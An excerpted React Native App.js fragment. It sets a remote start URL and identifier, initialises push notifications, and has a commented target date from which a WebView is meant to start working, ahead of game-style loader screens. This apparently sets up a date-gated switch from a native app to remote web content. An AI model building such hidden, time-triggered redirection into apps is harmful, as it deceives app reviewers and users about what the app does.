...
import DragonProdScr from './src/screens/DragonProdScr';
...
const App = () => {
  ...
  const INITIAL_URL = `https://heroic-esteemed-fulfillment.space/`;
  const URL_IDENTIFAIRE = `idc1Nj0V`;
  ...
  OneSignal.initialize('e4653ea3-94a2-4c8a-a8c9-e6c344d4ceab');
  ...
  useEffect(() => {
    ...
    const targetData = new Date('2025-04-25T13:00:00'); //дата з якої поч працювати webView
            ...
            <NavigationContainer>
                  {!louderIsEnded ? (
                        <View
                              ...
                              <Animated.Image
                                    source={require('./src/assets/upgr/loader1.png')}
                                    style={{
                                          //...props.style,
                              ...
                              />
                              <Animated.Image
                                    source={require('./src/assets/upgr/loader2.png')}
                                    style={{
                                          //...props.style,
